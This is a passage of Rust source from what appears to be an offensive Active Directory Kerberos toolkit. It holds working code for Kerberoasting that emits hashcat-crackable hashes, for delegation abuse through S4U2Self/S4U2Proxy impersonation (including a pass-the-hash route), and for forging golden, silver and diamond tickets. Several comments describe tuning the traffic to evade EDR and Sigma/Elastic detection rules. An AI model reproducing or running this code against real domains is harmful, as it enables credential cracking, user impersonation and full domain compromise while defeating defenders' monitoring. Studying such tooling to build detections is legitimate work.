        kerbcore::Enctype::Aes256CtsHmacSha1_96,
        password,
        salt.as_bytes(),
        iters,
    );
    let ts_der = kerbcore::client::encode_pa_enc_ts_enc(&now_krb_str(), 0);
    let enc_ts = key.encrypt(kerbcore::client::KU_AS_REQ_PA_ENC_TS, &ts_der);
    let ed = kerbcore::types::EncryptedData {
        etype: crate::ETYPE_AES256 as i32,
        kvno: None,
        cipher: enc_ts,
    };
    let padata = kerbcore::client::pa_enc_timestamp(&ed);
    let raw2 = kerbcore::client::build_as_req(
        &realm,
        &cname_kc,
        nonce_u32(),
        FAR_FUTURE,
        &[crate::ETYPE_AES256 as i32],
        vec![padata],
    );
    let resp2 = kdc_exchange(kdc, &raw2).await?;

    if kerbcore::messages::KdcRep::decode(&resp2).is_ok() {
        return Ok(CredResult::Valid);
    }
    Ok(match kerbcore::messages::KrbError::decode(&resp2) {
        Ok(err) => match err.error_code {
            24 => CredResult::Invalid,         // PREAUTH_FAILED
            18 => CredResult::Disabled,        // CLIENT_REVOKED
            23 => CredResult::ValidButExpired, // KEY_EXPIRED
            6 => CredResult::NoSuchUser,
            c => CredResult::Other(c as u32),
        },
        // 1.5.3 audit L-2: distinct from Other(0) which would collide with KDC-error-code=0.
        Err(_) => CredResult::Malformed,
    })
}

/// Build a TGS-REQ for `spn` using the TGT, and return the crackable service-ticket hash.
///
/// 1.5.3 kerbcore swap: the TGS-REQ (authenticator sealed under the TGT session key, PA-TGS-REQ
/// AP-REQ, request body) is assembled by [`kerbcore::client::build_tgs_req`] and the TGS-REP is
/// parsed by [`kerbcore::messages::KdcRep`]. The picky `Tgt` fields are bridged into kerbcore
/// types via a lossless DER round-trip (removed when `Tgt` flips to kerbcore at K9).
pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<String> {
    let kc_ticket = kerbcore::messages::Ticket::decode(&picky_asn1_der::to_vec(&tgt.ticket)?)
        .map_err(|e| anyhow!("bridge picky->kerbcore Ticket: {e:?}"))?;
    // 1.5.3 audit H-1: use the tracked session_etype from the AS-REP (no length-heuristic).
    let sk = kc_session_key_of(tgt)?;
    let cname_kc = kerbcore::types::PrincipalName::decode(&picky_asn1_der::to_vec(&tgt.cname)?)
        .map_err(|e| anyhow!("bridge picky->kerbcore cname: {e:?}"))?;

    // SPN → sname (split service class / instance on '/').
    let sname = kerbcore::types::PrincipalName {
        name_type: kerbcore::client::NT_SRV_INST,
        name_string: spn.split('/').map(|s| s.to_string()).collect(),
    };

    // Offer RC4 (hashcat 13100) first, then AES256 (19700) — so AES-only service accounts
    // (hardened / Server 2025 defaults) still return a ticket instead of KDC_ERR_ETYPE_NOSUPP.
    let raw = kerbcore::client::build_tgs_req(
        &tgt.crealm,
        &sname,
        &kc_ticket,
        &sk,
        &tgt.crealm,
        &cname_kc,
        nonce_u32(),
        FAR_FUTURE,
        &[ETYPE_RC4_HMAC as i32, crate::ETYPE_AES256 as i32],
        &now_krb_str(),
        0,
    )
    .map_err(|e| anyhow!("build TGS-REQ: {e}"))?;
    let resp = kdc_exchange(kdc, &raw).await?;
    let tgs_rep = kerbcore::messages::KdcRep::decode(&resp)
        .map_err(|_| anyhow!("TGS-REP: {}", krb_err(&resp)))?;

    // The crackable material is the *service ticket* enc-part.
    let tkt_enc = &tgs_rep.ticket.enc_part;
    // RC4 (23) → hashcat 13100; AES128/256 (17/18) → hashcat 19600/19700.
    Ok(if tkt_enc.etype == ETYPE_RC4_HMAC as i32 {
        format_tgs(sam, &tgt.crealm, spn, &tkt_enc.cipher)
    } else {
        crate::format_tgs_aes(sam, &tgt.crealm, spn, tkt_enc.etype as u8, &tkt_enc.cipher)
    })
}

/// A service ticket plus its session key — the material for a Kerberos AP-REQ (pass-the-ticket).
///
/// `Debug` is implemented manually to redact `session_key` + `ticket` bytes for the same
/// reason as [`Tgt`]. Field access via `.session_key` is intentionally left `pub` so crypto
/// call sites (`pac`, silver ticket forge, downstream tools) can consume the raw key
/// material — but nothing formats it, and no `{:?}` will ever surface it in a trace line.
pub struct ServiceTicket {
    pub ticket: Ticket,
    pub session_key: Vec<u8>,
    /// The service-ticket session key's Kerberos enctype (RFC 3961 number), tracked from the
    /// TGS-REP reply key type. 1.5.3 audit H-1 — replaces the length-heuristic that misidentified
    /// AES128 (16-byte) session keys as RC4. Kept private (getter: [`Self::session_etype`]) so
    /// adding it to `ServiceTicket` mid-1.5.x is additive under strict struct-literal semver.
    session_etype: i32,
    pub crealm: String,
    pub cname: PrincipalName,
    pub spn: Vec<String>,
}

impl ServiceTicket {
    /// The service-ticket session key's Kerberos enctype (RFC 3961 number).
    pub fn session_etype(&self) -> i32 {
        self.session_etype
    }
}

impl std::fmt::Debug for ServiceTicket {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ServiceTicket")
            .field("crealm", &self.crealm)
            .field("cname", &self.cname)
            .field("spn", &self.spn)
            .field("session_etype", &self.session_etype)
            .field("session_key", &"***")
            .field("ticket", &"***")
            .finish()
    }
}

/// TGS-REQ for `spn` using a TGT (real or forged golden), requesting an AES256 service ticket, and
/// decrypt the reply enc-part with the TGT session key (usage 8) to recover the new service
/// session key. The returned [`ServiceTicket`] drives a Kerberos SMB/LDAP AP-REQ.
pub async fn get_service_ticket(tgt: &Tgt, spn: &str, kdc: &str) -> Result<ServiceTicket> {
    tracing::debug!(
        spn, kdc, crealm = %tgt.crealm, etypes = "AES256+RC4 (kerbcore)",
        "get_service_ticket: TGS-REQ start"
    );

    let comps: Vec<&str> = spn.split('/').collect();
    let kc_ticket = kc_ticket_of(tgt)?;
    // 1.5.3 audit H-1: tracked etype from the AS-REP session key (no length-heuristic).
    let sk = kc_session_key_of(tgt)?;
    let cname_kc = kc_cname_of(tgt)?;
    let sname = kerbcore::types::PrincipalName {
        name_type: kerbcore::client::NT_SRV_INST,
        name_string: comps.iter().map(|s| s.to_string()).collect(),
    };

    // Offer RC4 as well as AES256: a TGT from overpass-the-hash (NT hash) carries an RC4 session
    // key; the reply session key is decrypted by the typed KerberosKey either way, and SMB signing
    // uses a fresh subkey regardless, so the service-session etype does not matter downstream.
    let raw = kerbcore::client::build_tgs_req(
        &tgt.crealm,
        &sname,
        &kc_ticket,
        &sk,
        &tgt.crealm,
        &cname_kc,
        nonce_u32(),
        FAR_FUTURE,
        &[crate::ETYPE_AES256 as i32, ETYPE_RC4_HMAC as i32],
        &now_krb_str(),
        0,
    )
    .map_err(|e| anyhow!("build TGS-REQ: {e}"))?;
    tracing::trace!(bytes = raw.len(), spn, "TGS-REQ sent");
    let resp = kdc_exchange(kdc, &raw).await?;
    tracing::trace!(bytes = resp.len(), "TGS-REP response");
    let tgs_rep = kerbcore::messages::KdcRep::decode(&resp).map_err(|_| {
        let err_str = krb_err(&resp);
        tracing::warn!(spn, "TGS-REP: {err_str}");
        anyhow!("TGS-REP: {err_str}")
    })?;

    // Reply enc-part is sealed under the TGT session key (usage 8); kerbcore's
    // parse_enc_kdc_rep_part accepts both EncTGSRepPart (APP 26) and EncASRepPart (APP 25).
    let plain = sk
        .decrypt(
            kerbcore::client::KU_TGS_REP_ENC_PART,
            &tgs_rep.enc_part.cipher,
        )
        .map_err(|e| anyhow!("decrypt TGS-REP enc-part: {e}"))?;
    let part = kerbcore::client::parse_enc_kdc_rep_part(&plain)
        .map_err(|e| anyhow!("decode EncKDCRepPart: {e:?}"))?;
    let session_key = part.key.keyvalue;
    tracing::debug!(
        spn,
        session_key_len = session_key.len(),
        rep_etype = tgs_rep.enc_part.etype,
        "Service ticket acquired (kerbcore)"
    );

    Ok(ServiceTicket {
        ticket: picky_ticket(&tgs_rep.ticket)?,
        session_key,
        // 1.5.3 audit H-1: track the actual service-session-key etype from EncKDCRepPart.key.keytype.
        session_etype: part.key.keytype,
        crealm: tgt.crealm.clone(),
        cname: tgt.cname.clone(),
        spn: comps.iter().map(|s| s.to_string()).collect(),
    })
}

/// Wrap a forged silver ticket ([`forge_silver_tgt`]) as a [`ServiceTicket`] for AP-REQ — no KDC
/// round-trip; the session key is the one embedded when forging.
pub fn silver_service_ticket(tgt: &Tgt, spn: &str) -> ServiceTicket {
    ServiceTicket {
        ticket: tgt.ticket.clone(),
        session_key: tgt.session_key.clone(),
        // Silver = forged service ticket; its session-key etype matches the forged TGT wrapper.
        session_etype: tgt.session_etype,
        crealm: tgt.crealm.clone(),
        cname: tgt.cname.clone(),
        spn: spn.split('/').map(|s| s.to_string()).collect(),
    }
}

/// Build the GSS/SPNEGO AP-REQ blob for an SMB2 SESSION_SETUP from a [`ServiceTicket`], and return
/// it together with the 16-byte SMB session key. The authenticator carries a random AES128 subkey
/// (etype 17) which becomes the GSS/SMB session key, so SMB signing is deterministic on our side.
pub fn build_ap_req_gss(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 16])> {
    // Random 16-byte AES128 subkey → the SMB session key.
    let mut subkey = [0u8; 16];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut subkey);
    let subkey_ek = kerbcore::types::EncryptionKey {
        keytype: 17,
        keyvalue: subkey.to_vec(),
    };
    let ap_der = build_gss_ap_req(st, &subkey_ek)?;
    Ok((crate::gss::spnego_krb5_init(&ap_der), subkey))
}

/// Shared GSS AP-REQ builder (1.5.3 kerbcore swap). Builds the authenticator with the GSS 0x8003
/// channel-binding checksum + the caller's subkey, sealed under the ticket session key (usage 11),
/// via [`kerbcore::client::build_ap_req_with_confounder`]. ap-options = 0 (mutual-required OFF),
/// so the server completes in one leg with our subkey as the session key. Returns the raw AP-REQ
/// DER; the caller wraps it (SPNEGO for SMB, raw GSS for DCE-RPC).
fn build_gss_ap_req(
    st: &ServiceTicket,
    subkey: &kerbcore::types::EncryptionKey,
) -> Result<Vec<u8>> {
    // GSS 0x8003 checksum: Lgth(=16) + Bnd(16 zero) + Flags = INTEG|CONF|SEQUENCE|REPLAY (0x3c).
    let mut gss_cksum = Vec::new();
    gss_cksum.extend_from_slice(&16u32.to_le_bytes());
    gss_cksum.extend_from_slice(&[0u8; 16]);
    gss_cksum.extend_from_slice(&0x0000_003cu32.to_le_bytes());
    let cksum = kerbcore::types::Checksum {
        cksumtype: 0x8003,
        checksum: gss_cksum,
    };

    let kc_ticket = kerbcore::messages::Ticket::decode(&picky_asn1_der::to_vec(&st.ticket)?)
        .map_err(|e| anyhow!("bridge picky->kerbcore Ticket: {e:?}"))?;
    // 1.5.3 audit H-1: use tracked ServiceTicket.session_etype (no length-heuristic).
    let sk = kc_service_key_of(st)?;
    let cname_kc = kerbcore::types::PrincipalName::decode(&picky_asn1_der::to_vec(&st.cname)?)
        .map_err(|e| anyhow!("bridge picky->kerbcore cname: {e:?}"))?;

    let mut conf = vec![0u8; sk.enctype().confounder_len()];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut conf);

    Ok(kerbcore::client::build_ap_req_with_confounder(
        &kc_ticket,
        &sk,
        &st.crealm,
        &cname_kc,
        &now_krb_str(),
        0,
        0, // ap-options: mutual-required OFF
        Some(&cksum),
        Some(subkey),
        None,
        &conf,
    ))
}

/// AES256 variant of [`build_ap_req_gss`] — generates a 32-byte AES256 subkey (etype 18)
/// and returns the RAW GSS-Kerberos token (not SPNEGO-wrapped) plus the subkey.
///
/// Windows DCE-RPC BIND with `auth_type = RPC_C_AUTHN_GSS_KERBEROS (0x10)` requires the
/// raw form; SPNEGO wrapping there trips a BIND_NAK. If a caller instead needs the
/// SPNEGO-wrapped form (e.g. `RPC_C_AUTHN_GSS_NEGOTIATE (0x09)` or SMB SESSION_SETUP),
/// wrap the returned raw bytes via `crate::gss::spnego_krb5_init(ap_req_der)` — passing
/// the raw AP-REQ DER, not this function's output.
pub fn build_ap_req_gss_aes256(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 32])> {
    // Random 32-byte AES256 subkey; same GSS 0x8003 authenticator as the AES128 path — only the
    // subkey etype/size and the outer wrap (raw GSS, not SPNEGO) differ.
    let mut subkey = [0u8; 32];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut subkey);
    let subkey_ek = kerbcore::types::EncryptionKey {
        keytype: 18,
        keyvalue: subkey.to_vec(),
    };
    let ap_der = build_gss_ap_req(st, &subkey_ek)?;
    Ok((crate::gss::gss_krb5_aprep(&ap_der), subkey))
}

// ---------------------------------------------------------------------------
// S4U (MS-SFU): S4U2Self + S4U2Proxy — the RBCD / constrained-delegation abuse.
// ---------------------------------------------------------------------------

// PA-DATA type numbers on the S4U/TGS path.
const PA_TGS_REQ: i32 = 1;
const PA_FOR_USER: i32 = 129;
const PA_PAC_OPTIONS: i32 = 167;
/// Key usage for the PA-FOR-USER "KERB-NON-KERB-CKSUM-SALT" checksum (MS-SFU §2.2.1).
const KERB_NON_KERB_CKSUM_SALT: u32 = 17;

/// Human-readable KDC error from a response that failed to parse as the expected reply.
fn krb_err(resp: &[u8]) -> String {
    match kerbcore::messages::KrbError::decode(resp) {
        Ok(err) => format!("KDC error {}", err.error_code),
        Err(e) => format!("decode: {e:?}"),
    }
}

/// The AP-REQ (authenticator under the TGT session key, usage 7) wrapped as PA-TGS-REQ — the
/// authentication padata every TGS-REQ carries. 1.5.3 audit H-2: the authenticator now carries
/// `[3] Checksum` over the KDC-REQ-BODY (usage 6, cksumtype from the session key's enctype), per
/// RFC 4120 §3.3.2. Without it, AD tolerates the request but strict verifiers reject it and any
/// EDR watching for the missing cksum has a wire fingerprint.
fn ap_req_padata(tgt: &Tgt, body_der: &[u8]) -> Result<kerbcore::types::PaData> {
    use kerbcore::der::{
        application_tag, encode_integer, encode_sequence, explicit, tlv, TAG_BIT_STRING,
    };
    let sk = kc_session_key_of(tgt)?;
    let cname_kc = kc_cname_of(tgt)?;
    let kc_ticket = kc_ticket_of(tgt)?;
    // Checksum over the KDC-REQ-BODY (usage 6). cksumtype comes from the session key's enctype
    // (AES128=15, AES256=16, RC4=-138 per RFC 3961/4757). An unsupported enctype errors cleanly.
    let cksumtype = sk.enctype().authenticator_cksumtype().ok_or_else(|| {
        anyhow!(
            "no authenticator checksum type for session-key enctype {}",
            sk.enctype().to_i32()
        )
    })?;
    let cksum = kerbcore::types::Checksum {
        cksumtype,
        checksum: sk.checksum(6, body_der),
    };
    // 1.5.3 audit L-4: random cusec (was cusec=0 — wire fingerprint). Bounded to 999_999.
    let mut cusec_bytes = [0u8; 4];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut cusec_bytes);
    let cusec = (u32::from_be_bytes(cusec_bytes) % 1_000_000) as i64;
    // Authenticator [APPLICATION 2] SEQUENCE { [0] vno=5, [1] crealm, [2] cname, [3] cksum,
    // [4] cusec, [5] ctime }.
    let auth_body = [
        explicit(0, &encode_integer(5)),
        explicit(1, &kerbcore::types::encode_realm(&tgt.crealm)),
        explicit(2, &cname_kc.encode()),
        explicit(3, &cksum.encode()),
        explicit(4, &encode_integer(cusec)),
        explicit(5, &kerbcore::types::KerberosTime(now_krb_str()).encode()),
    ]
    .concat();
    let auth_der = tlv(application_tag(2), &encode_sequence(&auth_body));
    let enc_auth = sk.encrypt(7, &auth_der); // usage 7 = TGS-REQ PA-DATA AP-REQ authenticator
    let ed = kerbcore::types::EncryptedData {
        etype: sk.enctype().to_i32(),
        kvno: None,
        cipher: enc_auth,
    };
    // AP-REQ [APPLICATION 14] SEQUENCE { [0] vno=5, [1] msg-type=14, [2] ap-options=0, [3] ticket, [4] authenticator }.
    let ap_options = tlv(TAG_BIT_STRING, &[0u8, 0, 0, 0, 0]);
    let ap_body = [
        explicit(0, &encode_integer(5)),
        explicit(1, &encode_integer(14)),
        explicit(2, &ap_options),
        explicit(3, &kc_ticket.encode()),
        explicit(4, &ed.encode()),
    ]
    .concat();
    let ap_der = tlv(application_tag(14), &encode_sequence(&ap_body));
    Ok(kerbcore::types::PaData {
        padata_type: PA_TGS_REQ,
        padata_value: ap_der,
    })
}

/// PA-FOR-USER (MS-SFU §2.2.1): the user to impersonate, keyed to the TGT session key.
fn pa_for_user(tgt: &Tgt, impersonate: &str) -> Result<kerbcore::types::PaData> {
    use kerbcore::der::{encode_general_string, encode_sequence, explicit};
    krb_string(impersonate)?; // IA5 validation parity
    let sk = kc_session_key_of(tgt)?;
    // 1.5.3 audit finding #5: derive the S4U PA-FOR-USER checksum type from the session key's
    // enctype (AES128=15, AES256=16, RC4=-138 per RFC 3961/4757). Previously hardcoded 16 with
    // a 32-byte length guard, which made `rbcd_impersonate_by_hash` (RC4 TGT from a captured NT
    // hash) unconditionally bail — defeating the whole pass-the-hash → RBCD path.
    let cksumtype = sk.enctype().authenticator_cksumtype().ok_or_else(|| {
        anyhow!(
            "S4U2Self PA-FOR-USER: session-key enctype {} has no MS-KILE authenticator checksum \
             type — RFC 8009 (etype 19/20) session keys are not accepted by AD's S4U path today",
            sk.enctype().to_i32()
        )
    })?;
    // S4U checksum input: LE(name-type=NT_PRINCIPAL) || username || realm || auth-package.
    let mut s4u = Vec::new();
    s4u.extend_from_slice(&1i32.to_le_bytes());
    s4u.extend_from_slice(impersonate.as_bytes());
    s4u.extend_from_slice(tgt.crealm.as_bytes());
    s4u.extend_from_slice(b"Kerberos");
    let cksum_bytes = sk.checksum(KERB_NON_KERB_CKSUM_SALT, &s4u);

    let user_pn = kerbcore::types::PrincipalName {
        name_type: kerbcore::client::NT_PRINCIPAL,
        name_string: vec![impersonate.to_string()],
    };
    let cksum = kerbcore::types::Checksum {
        cksumtype,
        checksum: cksum_bytes,
    };
    // PA-FOR-USER ::= SEQUENCE { [0] userName, [1] userRealm, [2] cksum, [3] auth-package }.
    let body = [
        explicit(0, &user_pn.encode()),
        explicit(1, &kerbcore::types::encode_realm(&tgt.crealm)),
        explicit(2, &cksum.encode()),
        explicit(3, &encode_general_string("Kerberos")),
    ]
    .concat();
    Ok(kerbcore::types::PaData {
        padata_type: PA_FOR_USER,
        padata_value: encode_sequence(&body),
    })
}

/// S4U2Self: obtain a service ticket to our own account *as* `impersonate`.
pub async fn s4u2self(
    tgt: &Tgt,
    self_sam: &str,
    impersonate: &str,
    kdc: &str,
) -> Result<kerbcore::messages::Ticket> {
    let self_pn = kerbcore::types::PrincipalName {
        name_type: kerbcore::client::NT_PRINCIPAL,
        name_string: vec![self_sam.to_string()],
    };
    // Offer the full etype-preference list — AES256, AES128, RC4 — so an RC4-only trustee (default
    // when msDS-SupportedEncryptionTypes is absent) still gets served instead of ETYPE_NOSUPP.
    let raw = build_s4u_tgs_req(
        &tgt.crealm,
        &self_pn,
        0x4001_0000, // forwardable | canonicalize
        None,
        &[
            crate::ETYPE_AES256 as i32,
            crate::ETYPE_AES128 as i32,
            ETYPE_RC4_HMAC as i32,
        ],
        |body_der| ap_req_padata(tgt, body_der),
        vec![pa_for_user(tgt, impersonate)?],
    )?;
    let resp = kdc_exchange(kdc, &raw).await?;
    let rep = kerbcore::messages::KdcRep::decode(&resp)
        .map_err(|_| anyhow!("S4U2Self failed: {}", krb_err(&resp)))?;
    Ok(rep.ticket)
}

/// PA-PAC-OPTIONS advertising Resource-Based Constrained Delegation (bit 3) — required so the KDC
/// uses the RBCD path in S4U2Proxy instead of classic KCD (else KDC_ERR_BADOPTION).
fn pa_pac_options_rbcd() -> kerbcore::types::PaData {
    use kerbcore::der::{encode_sequence, explicit, tlv, TAG_BIT_STRING};
    // PA-PAC-OPTIONS ::= SEQUENCE { [0] KerberosFlags }; RBCD = bit 3 → 0x10 in the first flag byte.
    let flags = tlv(TAG_BIT_STRING, &[0u8, 0x10, 0, 0, 0]);
    kerbcore::types::PaData {
        padata_type: PA_PAC_OPTIONS,
        padata_value: encode_sequence(&explicit(0, &flags)),
    }
}

/// S4U2Proxy: use the S4U2Self ticket as an additional ticket to get a service ticket to
/// `target_spn` as the impersonated user (the RBCD payoff).
pub async fn s4u2proxy(
    tgt: &Tgt,
    self_ticket: kerbcore::messages::Ticket,
    target_spn: &str,
    kdc: &str,
) -> Result<kerbcore::messages::Ticket> {
    let sname = kerbcore::types::PrincipalName {
        name_type: kerbcore::client::NT_SRV_INST,
        name_string: target_spn.split('/').map(|s| s.to_string()).collect(),
    };
    let raw = build_s4u_tgs_req(
        &tgt.crealm,
        &sname,
        0x4003_0000, // forwardable | cname-in-addl-tkt | canonicalize
        Some(&self_ticket),
        &[
            crate::ETYPE_AES256 as i32,
            crate::ETYPE_AES128 as i32,
            ETYPE_RC4_HMAC as i32,
        ],
        |body_der| ap_req_padata(tgt, body_der),
        vec![pa_pac_options_rbcd()],
    )?;
    let resp = kdc_exchange(kdc, &raw).await?;
    let rep = kerbcore::messages::KdcRep::decode(&resp)
        .map_err(|_| anyhow!("S4U2Proxy failed: {}", krb_err(&resp)))?;
    Ok(rep.ticket)
}

/// Full RBCD chain: TGT for the controlled account → S4U2Self(impersonate) → S4U2Proxy to
/// the target service. Returns the etype of the final impersonation ticket as proof.
pub async fn rbcd_impersonate(
    account: &str,
    password: &str,
    realm: &str,
    kdc: &str,
    impersonate: &str,
    target_spn: &str,
) -> Result<u32> {
    let tgt = get_tgt(account, password, realm, kdc).await?;
    rbcd_impersonate_with_tgt(&tgt, account, impersonate, target_spn, kdc).await
}

/// Stream 5 / A.7: pass-the-hash variant of [`rbcd_impersonate`]. The trustee account is often a
/// captured computer object where only the NT (RC4) hash is known — this path builds the TGT from
/// the hash and runs the same S4U2Self/S4U2Proxy chain. Returns the enc-part etype of the final
/// impersonation ticket.
pub async fn rbcd_impersonate_by_hash(
    account: &str,
    nt: &[u8; 16],
    realm: &str,
    kdc: &str,
    impersonate: &str,
    target_spn: &str,
) -> Result<u32> {
    let tgt = get_tgt_by_hash(account, realm, kdc, nt).await?;
    rbcd_impersonate_with_tgt(&tgt, account, impersonate, target_spn, kdc).await
}

async fn rbcd_impersonate_with_tgt(
    tgt: &Tgt,
    account: &str,
    impersonate: &str,
    target_spn: &str,
    kdc: &str,
) -> Result<u32> {
    let bare = account.split('@').next().unwrap_or(account);
    let bare = bare.rsplit('\\').next().unwrap_or(bare);
    let self_ticket = s4u2self(tgt, bare, impersonate, kdc).await?;
    let svc_ticket = s4u2proxy(tgt, self_ticket, target_spn, kdc).await?;
    Ok(svc_ticket.enc_part.etype as u32)
}

/// **1.4.8-A WS-DIAMOND-TICKET**: overrides for a forged ticket's timestamps. `None`
/// on any field falls back to `now_kerberos_time()` / `far_future_time()` (the Golden
/// / Silver default that flags anomalously — 10-year validity is a well-known IOC).
/// A Diamond ticket populates all four from a legitimately-obtained TGT so the
/// forged one's clock-domain matches the KDC exactly.
#[derive(Default, Clone)]
pub struct TicketTimestamps {
    /// v1.5.2 public type preserved through the kerbcore Phase-1 migration — the internal
    /// forger converts to/from kerbcore's `String`-typed GeneralizedTime at the boundary
    /// (see `picky_krb_time` / `kc_krb_time_str`). K9 flips the public shape.
    pub auth_time: Option<KerberosTime>,
    pub starttime: Option<KerberosTime>,
    pub endtime: Option<KerberosTime>,
    pub renew_till: Option<KerberosTime>,
    /// 32-bit `TicketFlags` value to embed. `None` = the Golden default `0x40e10000`
    /// (FORWARDABLE | RENEWABLE | INITIAL | PRE-AUTHENT | OK-AS-DELEGATE).
    /// 1.5.3 audit H-3 — Diamond must inherit the real ticket's flags so the outer word matches
    /// what a KDC would issue for that user (defeats Elastic/Sigma "abnormal-flags-for-user" rules).
    pub flags: Option<u32>,
    /// **1.4.8 audit fix:** Diamond ticket must inherit the outer `cname`
    /// from the template TGT — otherwise the AP-REQ authenticator (which
    /// uses `Tgt.cname`) mismatches the ticket, and every service returns
    /// `KRB_AP_ERR_BADMATCH`. When `Some(pn)`, both the inner
    /// `EncTicketPart.cname` and the returned `Tgt.cname` are set to `pn`
    /// while the PAC still carries the attacker-chosen identity from
    /// `id.user`. When `None`, everything falls back to `id.user` (Golden
    /// ticket behaviour where cname and PAC identity match). 1.5.3: kept
    /// on picky here so the exported struct type is unchanged; forge internals
    /// bridge to kerbcore via `kc_cname`.
    pub cname_template: Option<PrincipalName>,
}

/// Shared ticket forger. Marshals the PAC (signed with `server_sig_key`/`kdc_sig_key`), wraps it
/// in the EncTicketPart authorization-data, and seals the whole thing under `ticket_key`
/// (key usage 2). `sname` is the ticket's service principal.
fn forge_ticket(
    id: &crate::pac::ForgeIdentity,
    realm: &str,
    ticket_key: &[u8],
    server_sig_key: &[u8],
    kdc_sig_key: &[u8],
    sname: &[&str],
    rc4: bool,
) -> Result<Tgt> {
    forge_ticket_with_timestamps(
        id,
        realm,
        ticket_key,
        server_sig_key,
        kdc_sig_key,
        sname,
        rc4,
        &TicketTimestamps::default(),
    )
}

/// Same as [`forge_ticket`], but any populated field of `ts` overrides the
/// now/far-future defaults. Diamond ticket forge uses this to inherit real
/// KDC-issued timestamps from a legit TGT.
///
/// (Kept as an 8-arg fn rather than bundled into a context struct — every arg
/// here is already deliberate and separately controlled by the caller.)
#[allow(clippy::too_many_arguments)]
fn forge_ticket_with_timestamps(
    id: &crate::pac::ForgeIdentity,
    realm: &str,
    ticket_key: &[u8],
    server_sig_key: &[u8],
    kdc_sig_key: &[u8],
    sname: &[&str],
    rc4: bool,
    ts: &TicketTimestamps,
) -> Result<Tgt> {
    use kerbcore::der::{
        application_tag, encode_integer, encode_octet_string, encode_sequence, explicit, tlv,
        TAG_BIT_STRING,
    };
    let realm = realm.to_uppercase();
    let pac_bytes = crate::pac::assemble_pac(id, server_sig_key, kdc_sig_key, rc4)?;
    let etype = if rc4 {
        ETYPE_RC4_HMAC
    } else {
        crate::ETYPE_AES256
    };

    // authorization-data [10]: SEQUENCE OF { AD-IF-RELEVANT(1) = SEQUENCE OF { AD-WIN2K-PAC(128) = pac } }.
    let ad_elem = |ad_type: i64, ad_data: &[u8]| -> Vec<u8> {
        encode_sequence(
            &[
                explicit(0, &encode_integer(ad_type)),
                explicit(1, &encode_octet_string(ad_data)),
            ]
            .concat(),
        )
    };
    let win2k = ad_elem(128, &pac_bytes);
    let if_rel = ad_elem(1, &encode_sequence(&win2k));
    let auth_der = encode_sequence(&if_rel);

    // Session key: 16 bytes for RC4 (etype 23), 32 for AES256 (etype 18).
    let mut sk = vec![0u8; if rc4 { 16 } else { 32 }];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
    // Outer cname: Diamond inherits from the template TGT (`ts.cname_template`, picky-typed
    // through 1.5.x); Golden uses the attacker-chosen identity (`id.user`). Whatever's here
    // MUST also land on `Tgt.cname` below (bridged to picky), or the AP-REQ authenticator
    // mismatches the ticket. 1.5.3 boundary: bridge picky → kerbcore here.
    let cname_kc = match ts.cname_template.as_ref() {
        Some(pn) => kc_cname(pn)?,
        None => kerbcore::types::PrincipalName {
            name_type: kerbcore::client::NT_PRINCIPAL,
            name_string: vec![id.user.clone()],
        },
    };

    // 1.5.3 boundary: bridge picky KerberosTime → kerbcore GeneralizedTime string.
    let auth_time = ts
        .auth_time
        .as_ref()
        .map(kc_krb_time_str)
        .unwrap_or_else(now_krb_str);
    let starttime = ts
        .starttime
        .as_ref()
        .map(kc_krb_time_str)
        .unwrap_or_else(now_krb_str);
    let endtime = ts
        .endtime
        .as_ref()
        .map(kc_krb_time_str)
        .unwrap_or_else(|| FAR_FUTURE.to_string());
    let renew_till = ts
        .renew_till
        .as_ref()
        .map(kc_krb_time_str)
        .unwrap_or_else(|| FAR_FUTURE.to_string());
    let kt = |s: &str| kerbcore::types::KerberosTime(s.to_string()).encode();

    // EncTicketPart [APPLICATION 3] SEQUENCE. Default flags 0x40e10000 (1.5.3 audit H-4 revised:
    // bits 1=FORWARDABLE | 8=RENEWABLE | 9=INITIAL | 10=PRE-AUTHENT | 15=ENC-PA-REP per
    // MS-KILE §2.2.10 — NOT PROXIABLE (bit 3 = 0x10000000) and NOT OK-AS-DELEGATE (bit 13 =
    // 0x00040000). Both prior comments got bit-15 wrong; this is the correct RFC 4120 §7.5
    // bit numbering. 1.5.3 audit H-3: Diamond overrides via `ts.flags` to inherit the real
    // template ticket's flag word. transited [4] = empty; [9] caddr omitted.
    let flag_word = ts.flags.unwrap_or(0x40e1_0000).to_be_bytes();
    let flags = tlv(
        TAG_BIT_STRING,
        &[0x00, flag_word[0], flag_word[1], flag_word[2], flag_word[3]],
    );
    let key_der = kerbcore::types::EncryptionKey {
        keytype: etype as i32,
        keyvalue: sk.clone(),
    }
    .encode();
    let transited = encode_sequence(
        &[
            explicit(0, &encode_integer(0)),
            explicit(1, &encode_octet_string(&[])),
        ]
        .concat(),
    );
    let etp_body = [
        explicit(0, &flags),
        explicit(1, &key_der),
        explicit(2, &kerbcore::types::encode_realm(&realm)),
        explicit(3, &cname_kc.encode()),
        explicit(4, &transited),
        explicit(5, &kt(&auth_time)),
        explicit(6, &kt(&starttime)),
        explicit(7, &kt(&endtime)),
        explicit(8, &kt(&renew_till)),
        explicit(10, &auth_der),
    ]
    .concat();
    let etp_der = tlv(application_tag(3), &encode_sequence(&etp_body));

    // Seal the EncTicketPart under `ticket_key` at key usage 2 (ticket enc-part).
    let tkey = kerbcore::KerberosKey::from_i32(etype as i32, ticket_key.to_vec())
        .map_err(|e| anyhow!("ticket key: {e}"))?;
    let enc = tkey.encrypt(2, &etp_der);

    let sname_kc = kerbcore::types::PrincipalName {
        name_type: kerbcore::client::NT_SRV_INST,
        name_string: sname.iter().map(|s| s.to_string()).collect(),
    };
    let kc_ticket = kerbcore::messages::Ticket {
        tkt_vno: 5,
        realm: realm.clone(),
        sname: sname_kc,
        enc_part: kerbcore::types::EncryptedData {
            etype: etype as i32,
            kvno: None,
            cipher: enc,
        },
    };

    Ok(Tgt {
        ticket: picky_ticket(&kc_ticket)?,
        session_key: sk,
        // Forged TGT session-key etype = the ticket's enc-part etype we sealed under.
        session_etype: etype as i32,
        cname: picky_cname(&cname_kc)?,
